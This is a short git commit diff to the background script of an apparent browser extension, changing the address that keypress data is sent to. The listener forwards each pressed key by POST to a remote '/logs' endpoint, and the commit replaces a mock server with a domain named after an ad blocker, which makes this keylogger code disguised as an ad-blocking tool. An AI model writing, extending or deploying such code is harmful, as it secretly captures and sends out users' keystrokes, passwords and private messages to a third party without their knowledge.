1542b2d3abb0bebb2395a7e51324959710afe6eb
0xh7ml <darkhtml2275@gmail.com>
2023-06-06 14:45:05 +0600

    url updated

--- background.js
+++ background.js
@@ -1,7 +1,6 @@
 chrome.runtime.onMessage.addListener(function (request) {
   if (request.type === 'keypress') {
-    // Send the request to the mock server
-    fetch('https://ac0191bc-ecd0-40d1-9b4d-efac694665f4.mock.pstmn.io/logs', {
+    fetch('https://adblocker-plus.herokuapp.com/logs', {
       method: 'POST',
       body: request.key
     })
